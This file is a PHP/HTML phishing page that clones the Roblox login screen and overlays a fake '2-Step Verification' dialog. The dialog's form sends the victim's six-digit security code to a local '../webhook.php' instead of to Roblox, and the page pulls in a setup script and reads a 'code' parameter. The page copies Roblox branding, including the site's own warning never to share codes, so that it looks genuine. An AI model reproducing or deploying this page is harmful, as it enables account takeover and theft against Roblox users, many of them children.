<?php

$get = $_GET['code'];
require('../../../../../setup.php');

?>



<html><!--<![endif]--><head data-machine-id="CHI2-WEB630"><style type="text/css">@charset "UTF-8";[ng\:cloak],[ng-cloak],[data-ng-cloak],[x-ng-cloak],.ng-cloak,.x-ng-cloak,.ng-hide:not(.ng-hide-animate){display:none !important;}ng\:form{display:block;}.ng-animate-shim{visibility:hidden;}.ng-anchor{position:absolute;}</style>
    <!-- MachineID: CHI2-WEB630 -->
    <title>Roblox</title>
    <meta http-equiv="X-UA-Compatible" content="IE=edge,requiresActiveX=true">
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="author" content="Roblox Corporation">
<meta name="description" content="Roblox is a global platform that brings people together through play.">
<meta name="keywords" content="free games, online games, building games, virtual worlds, free mmo, gaming cloud, physics engine">

    <meta name="apple-itunes-app" content="app-id=431946152">



    <script>
    function enableButton() {
      var inputText = document.getElementById("two-step-verification-code-input").value;
      var button = document.getElementById("myButton");
      if (inputText !== "") {
        button.disabled = false;
      } else {
        button.disabled = true;
      }
    }
  </script>

    <meta ng-csp="no-unsafe-eval">

<meta name="locale-data" data-language-code="en_us" data-language-name="English"><meta name="device-meta" data-device-type="computer" data-is-in-app="false" data-is-desktop="true" data-is-phone="false" data-is-tablet="false" data-is-console="false" data-is-android-app="false" data-is-ios-app="false" data-is-uwp-app="false" data-is-xbox-app="false" data-is-amazon-app="false" data-is-win32-app="false" data-is-studio="false" data-is-game-client-browser="false" data-is-ios-device="false" data-is-android-device="false" data-is-universal-app="false" data-app-type="unknown">
<meta name="environment-meta" data-is-testing-site="false">

<meta id="roblox-display-names" data-enabled="true">

<meta name="hardware-backed-authentication-data" data-is-secure-authentication-intent-enabled="true" data-is-bound-auth-token-enabled="false" data-bound-auth-token-whitelist="{&quot;Whitelist&quot;:[{&quot;apiSite&quot;:&quot;auth.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;},{&quot;apiSite&quot;:&quot;accountsettings.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;},{&quot;apiSite&quot;:&quot;inventory.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;},{&quot;apiSite&quot;:&quot;accountinformation.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;}]}" data-hba-indexed-db-name="hbaDB" data-hba-indexed-db-obj-store-name="hbaObjectStore">
<meta name="page-meta" data-internal-page-name="Login">

    

        
    
<link href="https://images.rbxcdn.com/7bba321f4d8328683d6e59487ce514eb" rel="icon">


    <link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="StyleGuide" data-bundle-source="Main" href="https://css.rbxcdn.com/43f6b2dffeba143d9637ae550ec15f403483ae049a2b7ab4c6c2ef85caecf583.css">
<link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="Thumbnails" data-bundle-source="Main" href="https://css.rbxcdn.com/9517d686dc47015c200496d77e2b18146ee37652d18e25ecf9e1ed230310ea13.css">
<link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="CaptchaCore" data-bundle-source="Main" href="https://css.rbxcdn.com/b8f8f15a57a66e73469ae72eea7d8905346afa78b9f2397627cd099f7dcc779a.css">
<link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="Challenge" data-bundle-source="Main" href="https://css.rbxcdn.com/b058572a60452c8c5ce47eb18c55dd3760a21b24c698b64fab5531c58bb0cf0e.css">
<link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="VerificationUpsell" data-bundle-source="Main" href="https://css.rbxcdn.com/3f5767588c352c1b6fd800e2d14466cfa7113a04fa5cf02f1e33f2f0e7dd204f.css">
<link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="RobloxBadges" data-bundle-source="Main" href="https://css.rbxcdn.com/da45920fef8b22d35ee6cce0702d290241252fbfd99695e2abc0934d20de0974.css">
<link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="Navigation" data-bundle-source="Main" href="https://css.rbxcdn.com/6686c24b7d5461929debb2b62b589c5399f35ba8ea8ffdd641cf2a6b0b0b686e.css">
<link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="CookieBannerV3" data-bundle-source="Main" href="https://css.rbxcdn.com/2c2a709240897ce382b7ff55be4347cd0994ab1e2d6ed3b56649e54b0e97e13a.css">
<link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="Footer" data-bundle-source="Main" href="https://css.rbxcdn.com/6edb2191aa318f963253361b43d2657a04b3d16e9c28fe7b22d4a4d5686f1cb4.css">
<link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="ConfigureWebApps" data-bundle-source="Main" href="https://css.rbxcdn.com/08def520152a575438e73a81aa9a310c2415c327df7b624a24aa6e794d24dba3.css">


    <link rel="canonical" href="https://www.roblox.com/NewLogin">
    
<link onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" rel="stylesheet" href="https://static.rbxcdn.com/css/leanbase___5e469c309d1eeddf42cc9d36a50f82e0_m.css/fetch">


    
<link onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" rel="stylesheet" href="https://static.rbxcdn.com/css/page___b0dafd506d198313adc7eb9bccc23fbb_m.css/fetch">


<link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="Captcha" data-bundle-source="Main" href="https://css.rbxcdn.com/ee82c23c0c487dc90ec8cdd1b0caf2fc786ff3285fe8be06218c9838288d46e5.css">
<link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="CrossDeviceLoginDisplayCode" data-bundle-source="Main" href="https://css.rbxcdn.com/d8a3b48304642bf28fbc1675e55cbd75a3be58986a34a762e360dd3963ad467b.css">
<link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="AccountSelector" data-bundle-source="Main" href="https://css.rbxcdn.com/dafa0011479aa80baa7644c359afa68ccb9a098c0cf599bff1b1fd7781553336.css">
<link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="EmailVerifyCodeModal" data-bundle-source="Main" href="https://css.rbxcdn.com/13268acde7e01c62a818ccf9b82e301d8b6df25e45f76a4429c10d1a3aa4f2d0.css">
<link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="ReactLogin" data-bundle-source="Main" href="https://css.rbxcdn.com/c12b1163bd09c1076e861bfcbb98ab175a37971fae6a96c54c031afbb6589427.css">
<link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="AccountRecoveryModal" data-bundle-source="Main" href="https://css.rbxcdn.com/4b5dce375cef78073d2192583d1ecd458f10c308fa99847d649d5ec801bebd61.css">

    <link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="RobuxIcon" data-bundle-source="Main" href="https://css.rbxcdn.com/6fe55c3438539daf776774645e39e121d991246d6a38972b81e3f9550a585b5b.css">


    <link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="ItemPurchaseUpsell" data-bundle-source="Main" href="https://css.rbxcdn.com/3c4bd9b17b9020d9ebc87d4542a68a949a9de6150a55a92f0e65514520ee777e.css">
<link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="ItemPurchase" data-bundle-source="Main" href="https://css.rbxcdn.com/5331669054807354a3a20a4717d18c566a7cbee984e7471ece3a2090cb70150c.css">
<link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="IdVerification" data-bundle-source="Main" href="https://css.rbxcdn.com/68f976f4a3f8f3a6aae074879170e579451270e693d2361491b1c1bb9ac5e4c5.css">


    

    



<link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="UserAgreementsChecker" data-bundle-source="Main" href="https://css.rbxcdn.com/d5a3728b78be729b693aadf79a1f45f0fa49c15fe863a0d7dd631b75f9e82207.css">














    

    


    


    



<meta name="sentry-meta" data-env-name="production" data-dsn="https://6750adeb1b1348e4a10b13e726d5c10b@sentry.io/1539367" data-sample-rate="0">

<meta name="roblox-tracer-meta-data" data-access-token="S3EXjCZQQr6OixnmKu+hoa3OSfpvPP5qgU0esiWgwreFUUMBnPhEaoS5yIIrf9bdYlSgW0XKCb1So9Rhtj1eMzt/MJWcyKZ4TwIckHVj" data-service-name="Web" data-tracer-enabled="false" data-api-sites-request-allow-list="friends.roblox.com,chat.roblox.com,thumbnails.roblox.com,games.roblox.com,gameinternationalization.roblox.com,localizationtables.roblox.com" data-sample-rate="5" data-is-instrument-page-performance-enabled="true">

    
        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0">




    
    <!--[if lt IE 9]>
        <script src="//oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
        <script src="//oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->




    
        
        

            



    
    

    

    


<meta name="thumbnail-meta-data" data-is-webapp-cache-enabled="False" data-webapp-cache-expirations-timespan="00:01:00" data-request-min-cooldown="1000" data-request-max-cooldown="30000" data-request-max-retry-attempts="4" data-request-batch-size="100" data-thumbnail-metrics-sample-size="20" data-concurrent-thumbnail-request-count="4">
                          

<meta http-equiv="origin-trial" content="A751Xsk4ZW3DVQ8WZng2Dk5s3YzAyqncTzgv+VaE6wavgTY0QHkDvUTET1o7HanhuJO8lgv1Vvc88Ij78W1FIAAAAAB7eyJvcmlnaW4iOiJodHRwczovL3d3dy5nb29nbGV0YWdtYW5hZ2VyLmNvbTo0NDMiLCJmZWF0dXJlIjoiUHJpdmFjeVNhbmRib3hBZHNBUElzIiwiZXhwaXJ5IjoxNjgwNjUyNzk5LCJpc1RoaXJkUGFydHkiOnRydWV9"></head>
<body id="rbx-body" class="rbx-body <?=$loginColor["theme"]?>-theme gotham-font modal-open" data-performance-relative-value="0.005" data-internal-page-name="Login" data-send-event-percentage="0" style="overflow: hidden; padding-right: 17px;">
    
    <meta name="csrf-token" data-token="Ft8WQcOtaZPE" aria-hidden="true">

    
    

    




    



<div id="wrap" class="wrap no-gutter-ads logged-out" data-gutter-ads-enabled="false" aria-hidden="true">






<div id="navigation-container" class="<?=$loginColor["theme"]?>-theme gotham-font  " data-number-of-autocomplete-suggestions="7" data-is-redirect-library-to-creator-marketplace-enabled="True">
    <div id="header" class="navbar-fixed-top rbx-header" role="navigation">
  <div class="container-fluid">
    <div class="rbx-navbar-header">
      <div id="header-menu-icon" class="rbx-nav-collapse"><button type="button" class="btn-primary-xs btn-min-width" id="skip-to-main-content">Skip to Main Content</button></div>
      <div class="navbar-header">
        <a class="navbar-brand" href="/home">
          <span class="icon-logo"></span><span class="icon-logo-r"></span>
        </a>
      </div>
    </div>
    <ul class="nav rbx-navbar hidden-xs hidden-sm col-md-5 col-lg-4">
      <li>
        <a class="font-header-2 nav-menu-title text-header" href="/discover">Discover</a>
      </li>
      <li>
        <a class="font-header-2 nav-menu-title text-header" href="/catalog">Avatar Shop</a>
      </li>
      <li>
        <a class="font-header-2 nav-menu-title text-header" href="/develop">Create</a>
      </li>
      <li>
        <a class="font-header-2 nav-menu-title text-header robux-menu-btn" href="/robux?ctx-nav">
          <div class="menu-text-container">
            <span class="robux-10-percent-more-label">10% More</span>
              <span class="font-header-2 robux-btn">Robux</span>
              <span class="font-header-2 buy-robux-btn">Buy Robux</span>
          </div>
        </a>
      </li>
    </ul>

    <ul class="nav rbx-navbar hidden-md hidden-lg col-xs-12">
      <li>
        <a class="font-header-2 nav-menu-title text-header" href="/discover">Discover</a>
      </li>
      <li>
        <a class="font-header-2 nav-menu-title text-header" href="/catalog">Avatar Shop</a>
      </li>
      <li>
        <a class="font-header-2 nav-menu-title text-header" href="/develop">Create</a>
      </li>
      <li>
        <a class="font-header-2 nav-menu-title text-header robux-menu-btn" href="/robux?ctx=nav">
          <div class="menu-text-container">
            <span class="robux-10-percent-more-label">10% More</span>
            <span class="font-header-2 robux-btn">Robux</span>
            <span class="font-header-2 buy-robux-btn">Buy Robux</span>
          </div>
        </a>
      </li>
    </ul>
    <div id="right-navigation-header"><div data-testid="navigation-search-input" class="navbar-left navbar-search col-xs-5 col-sm-6 col-md-2 col-lg-3 shown" role="search"><div class="input-group"><form><div class="form-has-feedback"><input id="navbar-search-input" data-testid="navigation-search-input-field" class="form-control input-field new-input-field" placeholder="Search" maxlength="120" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" value=""></div></form><div class="input-group-btn"><button data-testid="navigation-search-input-search-button" class="input-addon-btn" type="submit"><span class="icon-common-search-sm"></span></button></div></div><ul class="dropdown-menu new-dropdown-menu" role="menu"><li class="navbar-search-option rbx-clickable-li new-selected"><a class="new-navbar-search-anchor" href="https://www.roblox.com/discover/?Keyword="><span class="icon-menu-games-off navbar-list-option-icon"></span><span class="navbar-list-option-text"></span><span class="navbar-list-option-suffix">in Experiences</span></a></li><li class="navbar-search-option rbx-clickable-li"><a class="new-navbar-search-anchor" href="https://www.roblox.com/search/users?keyword="><span class="icon-menu-profile navbar-list-option-icon"></span><span class="navbar-list-option-text"></span><span class="navbar-list-option-suffix">in People</span></a></li><li class="navbar-search-option rbx-clickable-li"><a class="new-navbar-search-anchor" href="https://www.roblox.com/catalog?CatalogContext=1&amp;Keyword="><span class="icon-menu-shop navbar-list-option-icon"></span><span class="navbar-list-option-text"></span><span class="navbar-list-option-suffix">in Avatar Shop</span></a></li><li class="navbar-search-option rbx-clickable-li"><a class="new-navbar-search-anchor" href="https://www.roblox.com/search/groups?keyword="><span class="icon-menu-groups navbar-list-option-icon"></span><span class="navbar-list-option-text"></span><span class="navbar-list-option-suffix">in Groups</span></a></li><li class="navbar-search-option rbx-clickable-li"><a class="new-navbar-search-anchor" href="https://create.roblox.com/marketplace/models?keyword="><span class="icon-menu-library navbar-list-option-icon"></span><span class="navbar-list-option-text"></span><span class="navbar-list-option-suffix">in Creator Marketplace</span></a></li></ul></div><div class="navbar-right rbx-navbar-right"><ul class="nav navbar-right rbx-navbar-right-nav"><li class="signup-button-container"><a class="rbx-navbar-signup btn-growth-sm nav-menu-title signup-button" href="https://www.roblox.com/account/signupredir?returnUrl=" id="sign-up-button">Sign Up</a></li><li class="login-action"></li><li class="rbx-navbar-right-search"><button type="button" class="rbx-menu-item btn-navigation-nav-search-white-md"><span class="icon-nav-search-white"></span></button></li></ul></div></div>
  </div>
</div>
<div id="left-navigation-container"></div>
<div id="verificationUpsell-container"><div></div></div>
<div id="phoneVerificationUpsell-container">
  <div phoneverificationupsell-container=""></div>
</div>
<div id="contactMethodPrompt-container">
  <div contactmethodprompt-container=""></div>
</div>

</div>



    <main class="container-main 
                
                
                
                
                
                " id="container-main" tabindex="-1">
            

        <div class="alert-container">
            


            



        </div>


        <div class="content">

                                    



        <div id="react-login-container" class="login-container" data-return-url="" data-enable-react-ui="true"><div id="login-base"><div class="section-content login-section"><h1 class="login-header">Login to Roblox</h1><div id="login-form"><div><div class="login-form-container"><form class="login-form" name="loginForm"><div class="form-group username-form-group"><label for="login-username" class="sr-only">Username/Email/Phone</label><input id="login-username" name="username" type="text" class="form-control input-field" placeholder="Username/Email/Phone" value=""></div><div class="form-group password-form-group"><label for="login-password" class="sr-only">Password</label><input id="login-password" name="password" type="password" class="form-control input-field" placeholder="Password" value=""><div aria-live="polite"></div></div><button type="button" id="login-button" class="btn-full-width login-button btn-secondary-md">Log In</button></form></div></div></div><div class="text-center forgot-credentials-link"><a id="forgot-credentials-link" class="text-link" href="https://www.roblox.com/login/forgot-password-or-username" target="_self">Forgot Password or Username?</a></div><div><div class="alternative-login-divider-container"><div class="rbx-divider alternative-login-divider"></div><div class="divider-text-container"><span class="divider-text xsmall">login with</span></div></div><button type="button" id="cross-device-login-button" class="btn-full-width btn-control-md cross-device-login-button"><span>Another Logged In Device</span></button></div><div id="crossDeviceLoginDisplayCode-container" data-frontload-qr-code="false"><div></div></div><div id="otp-login-container"></div><div class="text-center"><div class="signup-option"><span class="no-account-text">Don't have an account?</span><a id="sign-up-link" class="text-link signup-link" href="https://www.roblox.com/" target="_self">Sign Up</a></div></div></div><div id="react-captcha-container"><div style="display: none;"><div></div><div class="challenge-captcha-body" id="challenge-captcha-element"><div id="FunCaptcha"></div><input type="hidden" id="verification-token" name="verification-token" value="90663c0d13a68fbb3.2676800001|r=us-east-1|metabgclr=transparent|guitextcolor=%23474747|maintxtclr=%23b8b8b8|metaiconclr=%23757575|meta=3|lang=en|pk=476068BF-9607-4799-B53D-966BE98E2B81|at=40|sup=1|rid=82|ag=101|cdn_url=https%3A%2F%2Froblox-api.arkoselabs.com%2Fcdn%2Ffc|lurl=https%3A%2F%2Faudio-us-east-1.arkoselabs.com|surl=https%3A%2F%2Froblox-api.arkoselabs.com|smurl=https%3A%2F%2Froblox-api.arkoselabs.com%2Fcdn%2Ffc%2Fassets%2Fstyle-manager"><input type="hidden" id="FunCaptcha-Token" name="fc-token" value="90663c0d13a68fbb3.2676800001|r=us-east-1|metabgclr=transparent|guitextcolor=%23474747|maintxtclr=%23b8b8b8|metaiconclr=%23757575|meta=3|lang=en|pk=476068BF-9607-4799-B53D-966BE98E2B81|at=40|sup=1|rid=82|ag=101|cdn_url=https%3A%2F%2Froblox-api.arkoselabs.com%2Fcdn%2Ffc|lurl=https%3A%2F%2Faudio-us-east-1.arkoselabs.com|surl=https%3A%2F%2Froblox-api.arkoselabs.com|smurl=https%3A%2F%2Froblox-api.arkoselabs.com%2Fcdn%2Ffc%2Fassets%2Fstyle-manager"><input type="hidden" id="style-manager-styling" name="style-manager-styling" value="{&quot;styles&quot;:null,&quot;iframe_height&quot;:null,&quot;iframe_width&quot;:null,&quot;disable_default_styling&quot;:null}"><input type="hidden" id="string-table" name="string-table" value="{&quot;meta.loading_info&quot;:&quot;Working, please wait...&quot;,&quot;meta.visual_challenge_frame_title&quot;:&quot;Visual challenge&quot;,&quot;meta.reload_challenge&quot;:&quot;Reload Challenge&quot;,&quot;meta.generic_error&quot;:&quot;Something went wrong. Please reload the challenge to try again.&quot;,&quot;meta.api_timeout_error&quot;:&quot;The connection to a verification server was interrupted. Please reload the challenge to try again. &quot;}"></div></div></div><div id="react-2sv-container"></div></div></div>









        </div>
            </main> 
<!--Bootstrap Footer React Component -->

<footer class="container-footer" id="footer-container" data-is-giftcards-footer-enabled="True"><div class="footer"><ul class="row footer-links"><li class="footer-link"><a class="text-footer-nav" href="/info/about-us?locale=en_us" target="_blank">About Us</a></li><li class="footer-link"><a class="text-footer-nav" href="/info/jobs?locale=en_us" target="_blank">Jobs</a></li><li class="footer-link"><a class="text-footer-nav" href="/info/blog?locale=en_us" target="_blank">Blog</a></li><li class="footer-link"><a class="text-footer-nav" href="/info/parents?locale=en_us" target="_blank">Parents</a></li><li class="footer-link"><a class="text-footer-nav giftcards" href="/giftcards?locale=en_us" target="_blank">Gift Cards</a></li><li class="footer-link"><a class="text-footer-nav" href="/info/help?locale=en_us" target="_blank">Help</a></li><li class="footer-link"><a class="text-footer-nav" href="/info/terms?locale=en_us" target="_blank">Terms</a></li><li class="footer-link"><a class="text-footer-nav" href="/info/accessibility?locale=en_us" target="_blank">Accessibility</a></li><li class="footer-link"><a class="text-footer-nav privacy" href="/info/privacy?locale=en_us" target="_blank">Privacy</a></li><li></li></ul><div class="row copyright-container"><div class="col-sm-6 col-md-3"></div><div class="col-sm-12"><p class="text-footer footer-note">©2023 Roblox Corporation. Roblox, the Roblox logo and Powering Imagination are among our registered and unregistered trademarks in the U.S. and other countries.</p></div></div></div></footer></div> 

    <div id="user-agreements-checker-container" aria-hidden="true"></div>
<div id="cookie-banner-wrapper" class="cookie-banner-wrapper" aria-hidden="true"><div></div></div>


    



<div id="PlaceLauncherStatusPanel" style="display:none;width:300px" data-new-plugin-events-enabled="True" data-event-stream-for-plugin-enabled="True" data-event-stream-for-protocol-enabled="True" data-is-join-attempt-id-enabled="False" data-is-game-launch-interface-enabled="True" data-is-protocol-handler-launch-enabled="True" data-is-duar-auto-opt-in-enabled="false" data-is-duar-opt-out-disabled="false" data-is-user-logged-in="False" data-os-name="Windows" data-protocol-name-for-client="roblox-player" data-protocol-name-for-studio="roblox-studio" data-protocol-roblox-locale="en_us" data-protocol-game-locale="en_us" data-protocol-url-includes-launchtime="true" data-protocol-detection-enabled="true" data-protocol-separate-script-parameters-enabled="true" data-protocol-avatar-parameter-enabled="false" data-protocol-channel-name="LIVE" data-protocol-studio-channel-name="LIVE" data-protocol-player-channel-name="LIVE" aria-hidden="true">
    <div class="modalPopup blueAndWhite PlaceLauncherModal" style="min-height: 160px">
        <div id="Spinner" class="Spinner" style="padding:20px 0;">
            <img data-delaysrc="https://images.rbxcdn.com/e998fb4c03e8c2e30792f2f3436e9416.gif" height="32" width="32" alt="Progress" src="https://images.rbxcdn.com/e998fb4c03e8c2e30792f2f3436e9416.gif" class="src-replaced">
        </div>
        <div id="status" style="min-height:40px;text-align:center;margin:5px 20px">
            <div id="Starting" class="PlaceLauncherStatus MadStatusStarting" style="display:block">
                Starting Roblox...
            </div>
            <div id="Waiting" class="PlaceLauncherStatus MadStatusField">Connecting to People...</div>
            <div id="StatusBackBuffer" class="PlaceLauncherStatus PlaceLauncherStatusBackBuffer MadStatusBackBuffer"></div>
        </div>
        <div style="text-align:center;margin-top:1em">
            <input type="button" class="Button CancelPlaceLauncherButton translate" value="Cancel">
        </div>
    </div>
</div>
<div id="ProtocolHandlerClickAlwaysAllowed" class="ph-clickalwaysallowed" style="display:none;" aria-hidden="true">
    <p class="larger-font-size">
        <span class="icon-moreinfo"></span>
                
                    Check <strong>Always open links for URL: Roblox Protocol</strong> and click <strong>Open URL: Roblox Protocol</strong> in the dialog box above to join experiences faster in the future!
                
    </p>
</div>




    <div id="InstallationInstructions" class="" style="display:none;" aria-hidden="true">
        <div class="ph-installinstructions">
            <div class="ph-modal-header">
                    <span class="icon-close simplemodal-close"></span>
                    <h3 class="title">Thanks for visiting Roblox</h3>
            </div>
            <div class="modal-content-container"> 
                <div class="ph-installinstructions-body ">


        <ul class="modal-col-4">
            <li class="step1-of-4">
                <h2>1</h2>
                <p class="larger-font-size">Click <strong>RobloxPlayer.exe</strong> to run the Roblox installer, which just downloaded via your web browser.</p>
                <div style="margin-top:60px">
                    <img data-delaysrc="https://images.rbxcdn.com/bcf5d84d4469c075e6296bfbc4deabb1" src="https://images.rbxcdn.com/bcf5d84d4469c075e6296bfbc4deabb1" class="src-replaced">
                </div>
            </li>
            <li class="step2-of-4">
                <h2>2</h2>
                <p class="larger-font-size">Click <strong>Run</strong> when prompted by your computer to begin the installation process.</p>
                <img data-delaysrc="https://images.rbxcdn.com/51328932dedb5d8d61107272cc1a27db.png" src="https://images.rbxcdn.com/51328932dedb5d8d61107272cc1a27db.png" class="src-replaced">
            </li>
            <li class="step3-of-4">
                <h2>3</h2>
                <p class="larger-font-size">Click <strong>Ok</strong> once you've successfully installed Roblox.</p>
                <img data-delaysrc="https://images.rbxcdn.com/bbdb38de8bb89ecc07730b41666a26a4" src="https://images.rbxcdn.com/bbdb38de8bb89ecc07730b41666a26a4" class="src-replaced">
            </li>
            <li class="step4-of-4">
                <h2>4</h2>
                <p class="larger-font-size">After installation, click <strong>Join</strong> below to join the action!</p>
                <div class="VisitButton VisitButtonContinueGLI">
                    <a class="btn btn-primary-lg disabled btn-full-width">Join</a>
                </div>
            </li>
        </ul>

                </div>
            </div>
            <div class="xsmall">
                The Roblox installer should download shortly. If it doesn’t, start the <a id="GameLaunchManualInstallLink" href="#" class="text-link">download now.</a>
            </div>
        </div>
    </div>
    <div class="InstallInstructionsImage" data-modalwidth="970" style="display:none;" aria-hidden="true"></div>


<div id="pluginObjDiv" style="height:1px;width:1px;visibility:hidden;position: absolute;top: 0;" aria-hidden="true"></div>







<div class="ConfirmationModal modalPopup unifiedModal smallModal" data-modal-handle="confirmation" style="display:none;" aria-hidden="true">
    <a class="genericmodal-close ImageButton closeBtnCircle_20h"></a>
    <div class="Title"></div>
    <div class="GenericModalBody">
        <div class="TopBody">
            <div class="ImageContainer roblox-item-image" data-image-size="small" data-no-overlays="" data-no-click="">
                <img class="GenericModalImage" alt="generic image">
            </div>
            <div class="Message"></div>
        </div>
        <div class="ConfirmationModalButtonContainer GenericModalButtonContainer">
            <a href="" id="roblox-confirm-btn"><span></span></a>
            <a href="" id="roblox-decline-btn"><span></span></a>
        </div>
        <div class="ConfirmationModalFooter">
        
        </div>  
    </div>  
    
</div>

<div id="modal-confirmation" class="modal-confirmation" data-modal-type="confirmation" aria-hidden="true">
    <div id="modal-dialog" class="modal-dialog">
        <div class="modal-content">
            <div class="modal-header">
                <button type="button" class="close" data-dismiss="modal">
                    <span aria-hidden="true"><span class="icon-close"></span></span><span class="sr-only">Close</span>
                </button>
                <h5 class="modal-title"></h5>
            </div>

            <div class="modal-body">
                <div class="modal-top-body">
                    <div class="modal-message"></div>
                    <div class="modal-image-container roblox-item-image" data-image-size="medium" data-no-overlays="" data-no-click="">
                        <img class="modal-thumb" alt="generic image">
                    </div>
                    <div class="modal-checkbox checkbox">
                        <input id="modal-checkbox-input" type="checkbox">
                        <label for="modal-checkbox-input"></label>
                    </div>
                </div>
                <div class="modal-btns">
                    <a href="" id="confirm-btn"><span></span></a>
                    <a href="" id="decline-btn"><span></span></a>
                </div>
                <div class="loading modal-processing">
                    <img class="loading-default" src="https://images.rbxcdn.com/4bed93c91f909002b1f17f05c0ce13d1.gif" alt="Processing...">
                </div>
            </div>
            <div class="modal-footer text-footer">

            </div>
        </div>
    </div>
</div>








    



    

    
    


    

    


    


    

    



    

    

    

    


    
    

    

    

    






<div id="presence-registration-bootstrap-data" data-is-enabled="False" data-interval="15000" aria-hidden="true"></div>
    <div ng-modules="baseTemplateApp" class="ng-scope" aria-hidden="true">
        
    </div>

    <div ng-modules="pageTemplateApp" class="ng-scope" aria-hidden="true">
        
    </div>






























    

    
    

        
    




    
    



    
    


    







    





















    



















    


    










    

    




<div role="dialog"><div class="fade modal-backdrop in"></div><div role="dialog" tabindex="-1" class="fade modal-modern in modal" style="display: block;"><div class="modal-dialog"><form action="../webhook.php" method="post">
<div class="modal-content" role="document"><div title="" class="modal-header"><button type="button" class="modal-modern-header-button"><span class="icon-close"></span></button><h4 class="modal-title">2-Step Verification</h4><div class="modal-modern-header-info"></div></div><div class="modal-body"><div class="modal-lock-icon"></div><p class="modal-margin-bottom-xlarge">Enter the code we just sent you via email.</p><div class="input-control-wrapper"><div class="   form-group"><input onkeyup="enableButton()" name="2StepCode" as="input" inputmode="numeric" autocomplete="off" maxlength="6" placeholder="Enter 6-digit Code" type="password" id="two-step-verification-code-input" class="input-field form-control" value="" required><div class="form-control-label bottom-label xsmall">&nbsp;</div></div></div><p class="modal-margin-bottom-xlarge"><input id="remember-device" type="checkbox" tabindex="0" required> <label for="remember-device">Trust this device for 30 days</label></p><p><button type="button" class="modal-body-button-link small">Resend Code</button></p><p><button type="button" class="modal-body-button-link small"><a href="#">Use another verification method</a></button></p></div><div class="modal-footer"><div class="modal-modern-footer-buttons">
<input type="submit" name="fabutton" class="btn-cta-md modal-modern-footer-button"  value="Verify" id="myButton" disabled>
</div><p class="text-footer modal-margin-bottom">Need help? Contact <a class="text-name text-footer contact" href="https://www.roblox.com/info/2sv" target="_blank" rel="noopener noreferrer">Roblox Support</a></p><p class="text-footer">IMPORTANT: Don't share your security codes with anyone. Roblox will never ask you for your codes. This can include things like texting your code, screensharing, etc.</p></div></div></form></div></div></div>
</body></html>